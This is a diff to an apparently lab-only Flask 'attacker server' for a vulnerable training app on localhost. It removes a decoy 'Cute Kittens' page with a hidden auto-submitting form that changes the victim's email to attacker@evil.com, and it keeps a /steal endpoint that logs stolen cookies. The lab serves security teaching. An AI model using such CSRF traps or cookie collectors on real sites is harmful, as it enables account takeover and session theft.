@@ -15,7 +15,6 @@ import os
 from flask import Flask, request
 
 app = Flask(__name__)
-TARGET = "http://127.0.0.1:5050"
 LOG = os.path.join(os.path.dirname(__file__), "stolen.log")
 
 
@@ -31,27 +30,10 @@ def steal():
     return "", 204  # empty response; the victim never notices
 
 
-@app.route("/csrf_poc.html")
-def csrf_poc():
-    """A booby-trapped page. Just visiting it silently changes the victim's
-    email to the attacker's — classic CSRF (works against VulnLab's /csrf
-    section in vulnerable mode)."""
-    return """<!DOCTYPE html>
-<html><body>
-  <h1>😻 Cute Kittens</h1>
-  <p>Enjoy these free kittens while this totally normal page loads...</p>
-  <form id="f" action="%s/csrf/change?mode=vuln" method="POST">
-    <input type="hidden" name="new_email" value="attacker@evil.com">
-  </form>
-  <script>document.getElementById('f').submit();</script>
-</body></html>""" % TARGET
-
-
 @app.route("/")
 def index():
     return ("evil.com attacker server.<br>"
-            "Endpoints: <code>/steal?c=...</code> (cookie drop), "
-            "<code>/csrf_poc.html</code> (CSRF trap). "
+            "Endpoint: <code>/steal?c=...</code> (cookie drop). "
             "Stolen cookies are logged to attacker/stolen.log.")
 
 
